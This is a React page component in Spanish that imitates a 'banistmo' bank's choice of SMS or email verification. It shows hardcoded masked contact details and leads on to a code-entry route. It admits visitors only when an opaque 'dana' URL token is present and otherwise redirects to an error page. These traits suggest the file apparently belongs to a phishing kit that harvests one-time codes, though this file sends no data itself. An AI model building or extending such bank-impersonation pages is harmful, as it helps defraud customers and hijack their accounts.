import React, { useEffect, useState } from 'react'
import { useLocation, useNavigate } from 'react-router-dom'
import { buildPathWithDana, getDanaParamFromSearch, persistDanaParam } from '../utils/dana'

const METHODS = [
  {
    id: 'sms',
    title: 'Envió de código por mensaje',
    detail: 'al +507 3**7654',
    icon: 'sms',
  },
  {
    id: 'email',
    title: 'Envió de código al correo',
    detail: 'dani**@b****.com',
    icon: 'email',
  },
]

export default function VerificationMethod() {
  const navigate = useNavigate()
  const location = useLocation()
  const [selectedMethod, setSelectedMethod] = useState(() => {
    try {
      return localStorage.getItem('banistmo:verificationMethod') || ''
    } catch {
      return ''
    }
  })
  const [danaParam, setDanaParam] = useState('')

  useEffect(() => {
    const danaValue = getDanaParamFromSearch(location.search)
    if (!danaValue) {
      setDanaParam('')
      navigate('/error', { replace: true })
      return
    }

    setDanaParam(danaValue)
    persistDanaParam(danaValue)
  }, [location.search, navigate])

  useEffect(() => {
    try {
      if (selectedMethod) {
        localStorage.setItem('banistmo:verificationMethod', selectedMethod)
      }
    } catch {}
  }, [selectedMethod])

  const handleSubmit = (event) => {
    event.preventDefault()
    if (selectedMethod) {
      navigate(buildPathWithDana('/codigo-verificacion', danaParam))
    }
  }

  return (
    <div className="w-full py-8">
      <div className="mx-auto max-w-3xl">
        <form
          onSubmit={handleSubmit}
          className="bg-white rounded-2xl shadow p-6 sm:p-10 flex flex-col items-center"
        >
          <h1 className="text-xl sm:text-2xl font-semibold text-gray-900 text-center">
            Elige un método de verificación.
          </h1>

          <div className="mt-8 w-full space-y-4">
            {METHODS.map((method) => (
              <label
                key={method.id}
                className={[
                  'flex items-center gap-4 border rounded-2xl px-4 py-4 transition-all cursor-pointer',
                  selectedMethod === method.id
                    ? 'border-yellow-400 bg-yellow-50 shadow-sm'
                    : 'border-gray-200 hover:border-yellow-300',
                ].join(' ')}
              >
                <span
                  className={[
                    'flex h-12 w-12 items-center justify-center rounded-full text-gray-700',
                    selectedMethod === method.id ? 'bg-yellow-100' : 'bg-gray-100',
                  ].join(' ')}
                >
                  {method.icon === 'sms' ? (
                    <SmsIcon className="h-6 w-6" />
                  ) : (
                    <MailIcon className="h-6 w-6" />
                  )}
                </span>

                <div className="flex-1">
                  <p className="text-base font-medium text-gray-900">{method.title}</p>
                  <p className="text-sm text-gray-600">{method.detail}</p>
                </div>

                <input
                  type="radio"
                  name="verification-method"
                  value={method.id}
                  checked={selectedMethod === method.id}
                  onChange={() => setSelectedMethod(method.id)}
                  className="h-5 w-5 border-gray-300 text-yellow-500 focus:ring-yellow-500"
                  aria-label={method.title}
                />
              </label>
            ))}
          </div>

          <button
            type="button"
            onClick={() => navigate(buildPathWithDana('/', danaParam))}
            className="mt-6 text-sm font-medium text-yellow-600 hover:text-yellow-700"
          >
            ¿Estos no son tus datos?
          </button>

          <button
            type="submit"
            disabled={!selectedMethod}
            className={[
              'mt-4 w-full rounded-full px-6 py-3 text-sm font-semibold transition-colors sm:w-auto',
              selectedMethod
                ? 'bg-yellow-400 text-gray-900 hover:bg-yellow-500'
                : 'bg-yellow-200 text-gray-500 cursor-not-allowed',
            ].join(' ')}
          >
            Continuar
          </button>
        </form>
      </div>
    </div>
  )
}

function SmsIcon({ className }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" className={className} aria-hidden="true">
      <rect x="3" y="4" width="18" height="16" rx="2" stroke="currentColor" />
      <path d="M3 9h18" stroke="currentColor" />
      <path d="M7 13h10M7 16h6" stroke="currentColor" strokeLinecap="round" />
    </svg>
  )
}

function MailIcon({ className }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" className={className} aria-hidden="true">
      <rect x="3" y="5" width="18" height="14" rx="2" stroke="currentColor" />
      <path d="M3 7l9 6 9-6" stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  )
}